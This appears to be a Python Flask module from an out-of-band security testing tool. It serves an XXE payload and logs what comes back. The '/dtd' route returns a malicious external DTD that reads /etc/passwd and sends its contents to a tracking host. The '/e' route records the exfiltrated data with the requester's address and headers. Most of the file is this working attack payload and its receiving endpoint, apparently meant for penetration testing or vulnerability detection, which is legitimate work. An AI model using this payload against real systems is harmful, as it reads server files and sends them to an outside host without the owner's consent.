from flask import Blueprint, request, current_app
from lib.server.checkin import log_event
from lib.trackingtoken import TrackingToken
from lib.util import token_from_hostname
import logging
from .xxe import XXE

logger = logging.getLogger(__name__)

xxe_api = Blueprint('xxe', __name__)

@xxe_api.route('/dtd')
def xxe_dtd_handler():
    config = current_app.config['mole_config']
    t = TrackingToken(config, tags='xxe_server')
    # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-attack-yunusov-2013
    dtd = f"""
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % all "<!ENTITY send SYSTEM '<{config.token_protocol}://{t.full_token()}/?%file;'>">
%all;
    """

    return dtd


@xxe_api.route('/e')
def xxe_exfil():
    """Log exfiled data"""

    if request.headers.get('host', None):
        ctx = {'requester': request.remote_addr, 'raw_request': str(request.headers), 'data': request.args.get('data')}
        token = token_from_hostname(request.headers.get('host'))
        log_event(current_app.config['mole_config'], token, 'XXE exfil', ctx)

    return 'ok'


def setup(servers, payloads):
    payloads['xxe'] = XXE

    return xxe_api
